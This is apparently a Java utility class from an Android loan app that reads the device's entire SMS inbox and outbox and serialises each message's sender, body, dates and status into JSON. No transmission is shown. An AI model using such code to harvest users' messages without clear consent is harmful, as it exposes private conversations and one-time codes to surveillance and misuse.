package com.homecredit.loan.hcjson;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class SmsUtil {

    public final static String SYS_ID = "_id";
    public final static String SYS_ADDRESS = "address";
    public final static String SYS_PERSON = "person";
    public final static String SYS_DATE = "date";
    public final static String SYS_DATE_SENT = "date_sent";
    public final static String SYS_READ = "read";
    public final static String SYS_STAUS = "status";
    public final static String SYS_TYPE = "type";
    public final static String SYS_BODY = "body";
    public final static String SYS_SEEN = "seen";

    @SuppressLint("Range")
    public static JSONArray getSmsList(Context context) {
        JSONArray jsonArray = new JSONArray();
        String SMS_URI_ALL = "content://sms/";
        Cursor cursor = null;
        try {
            ContentResolver resolver = context.getContentResolver();
            String[] projection = new String[]{SYS_ID, SYS_ADDRESS, SYS_PERSON,
                    SYS_BODY, SYS_DATE, SYS_TYPE, SYS_READ, SYS_STAUS, SYS_SEEN, SYS_DATE_SENT};
            Uri uri = Uri.parse(SMS_URI_ALL);
            cursor = resolver.query(uri, projection, null, null, "date desc");
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    JSONObject obj = new JSONObject();
                    obj.put("phone", cursor.getString(cursor.getColumnIndex(SYS_ADDRESS)));
                    obj.put("content", cursor.getString(cursor.getColumnIndex(SYS_BODY)));
                    obj.put("time", cursor.getLong(cursor.getColumnIndex(SYS_DATE)));
                    obj.put("type", cursor.getInt(cursor.getColumnIndex(SYS_TYPE)));
                    obj.put("_id", cursor.getInt(cursor.getColumnIndex(SYS_ID)));
                    obj.put("sent_date", cursor.getLong(cursor.getColumnIndex(SYS_DATE_SENT)));
                    obj.put("date_sent", cursor.getLong(cursor.getColumnIndex(SYS_DATE_SENT)));
                    obj.put("read", cursor.getInt(cursor.getColumnIndex(SYS_READ)));
                    obj.put("seen", cursor.getInt(cursor.getColumnIndex(SYS_SEEN)));
                    obj.put("status", cursor.getInt(cursor.getColumnIndex(SYS_STAUS)));
                    obj.put("person", cursor.getInt(cursor.getColumnIndex(SYS_PERSON)));
                    jsonArray.put(obj);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return jsonArray;
    }
}